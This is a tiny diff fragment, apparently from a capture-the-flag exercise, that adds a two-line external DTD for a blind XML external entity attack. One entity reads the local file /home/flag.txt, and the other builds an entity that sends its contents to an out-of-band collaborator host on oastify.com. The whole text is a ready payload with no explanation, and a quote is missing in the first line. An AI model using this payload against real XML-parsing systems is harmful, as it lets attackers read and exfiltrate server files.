@@ -1,0 +1,2 @@
+<!ENTITY % data SYSTEM "file:///home/flag.txt>
+<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://h4m3tk5ru26enspjhyktpwp2qtwkka8z.oastify.com/%data;'>">
